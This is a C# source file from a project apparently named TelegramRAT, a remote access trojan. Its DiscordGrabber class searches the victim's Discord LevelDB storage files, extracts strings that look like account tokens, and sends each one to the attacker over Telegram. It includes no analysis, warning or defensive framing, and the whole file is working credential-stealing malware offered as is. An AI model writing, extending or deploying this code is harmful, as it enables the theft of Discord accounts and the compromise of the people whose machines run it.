using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace TelegramRAT
{
    internal class DiscordGrabber
    {

        // Get token
        public static void get()
        {
            var files = SearchForFile();
            if (files.Count == 0)
            {
                telegram.sendText("⛔ Didn't find any ldb files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        telegram.sendText($"💎 Discord token: {match.ToString()}");
                    }
                }
            }
        }

        // Locate *.ldb files
        private static List<string> SearchForFile()
        {
            List<string> ldbFiles = new List<string>();
            try
            {
                // Build path to Discord client LDB files
                string discordPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "Discord", "Local Storage", "leveldb");

                // Check if path exists
                if (!Directory.Exists(discordPath))
                {
                    telegram.sendText("⛔ Discord path not found: " + discordPath);
                    return ldbFiles;
                }

                // Traverse all LDB files in the directory
                foreach (string file in Directory.GetFiles(discordPath, "*.ldb"))
                {
                    try
                    {
                        string content = File.ReadAllText(file);
                        // Check if file contains "okay" string
                        if (content.Contains("okay"))
                        {
                            ldbFiles.Add(content);
                        }
                    }
                    catch (Exception ex)
                    {
                        // Continue to next file if there's an error with current one
                        continue;
                    }
                }
            }
            catch (Exception ex)
            {
                telegram.sendText("⛔ Error searching for Discord LDB files: " + ex.Message);
            }
            return ldbFiles;
        }
    }
}
